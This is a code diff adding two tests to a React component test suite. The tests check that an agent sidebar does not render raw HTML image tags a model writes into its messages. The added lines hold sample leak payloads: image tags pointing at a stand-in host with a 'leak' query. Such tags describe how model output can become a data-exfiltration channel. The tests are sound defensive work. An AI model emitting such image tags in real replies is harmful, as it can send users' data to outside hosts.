@@ -84,6 +84,23 @@ describe("AgentSidebarAgentMessage model-written images (data-leak channel)", ()
     expect(container.innerHTML).not.toContain("evil.example");
   });
 
+  it("never renders a raw HTML <img> tag a model wrote inline", () => {
+    const { container } = render(
+      <AgentSidebarAgentMessage content={'Before <img src="https://canary.example/leak?d=1"> after'} />,
+    );
+    expect(container.querySelector("img")).toBeNull();
+    expect(container.querySelector("[src]")).toBeNull();
+    expect(container.querySelector('[src*="canary.example"]')).toBeNull();
+  });
+
+  it("never renders a raw HTML <img> tag on its own block", () => {
+    const { container } = render(
+      <AgentSidebarAgentMessage content={'<img src="https://canary.example/x">'} />,
+    );
+    expect(container.querySelector("img")).toBeNull();
+    expect(container.querySelector("[src]")).toBeNull();
+  });
+
   it("still renders a normal link with target and rel", () => {
     render(<AgentSidebarAgentMessage content="[docs](https://ok.example)" />);
     const link = screen.getByRole("link", { name: "docs" });
